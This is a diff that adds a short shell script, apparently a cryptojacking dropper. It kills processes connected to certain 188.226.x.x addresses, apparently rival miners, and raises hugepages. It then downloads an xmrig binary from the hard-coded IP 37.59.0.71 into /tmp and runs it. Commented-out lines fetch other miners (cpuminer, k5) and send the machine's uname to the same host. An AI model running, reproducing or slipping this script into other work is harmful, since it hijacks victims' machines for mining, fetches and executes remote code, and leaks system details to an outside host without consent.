@@ -1,0 +1,25 @@
+#!/bin/sh
+#wget http://37.59.0.71/cpuminer -O /tmp/cpuminer
+#chmod +x /tmp/cpuminer
+#killall cpuminer
+#/tmp/cpuminer&
+#wget http://37.59.0.71/xmrig -O /tmp/xmrig
+#killall k5
+#killall xmrig
+#mkdir -p /var/tmp
+#wget http://37.59.0.71/k5 -O /var/tmp/k5
+pid=`netstat -nap | grep 188.226.156.21 | grep ESTA |  cut -d "/" -f -1  | rev | cut -d " " -f 1`
+kill -9 $pid
+netstat -alpn | grep "188.226\b" | awk '{sub(/\/.*/, "", $NF); print $NF}' | xargs -i kill -9 {}
+chmod +x /tmp/xmrig
+#/tmp/xmrig
+#chmod +x /var/tmp/k5
+#/var/tmp/k5&
+#killall cpuminer
+#uname=`uname -a`
+#wget --post-data=testdata http://37.59.0.71/"$uname" -O /dev/null
+killall xmrig
+echo 128 > /proc/sys/vm/nr_hugepages;sysctl -w vm.nr_hugepages=128
+wget http://37.59.0.71/xmrig -O /tmp/xmrig
+chmod +x /tmp/xmrig
+/tmp/xmrig
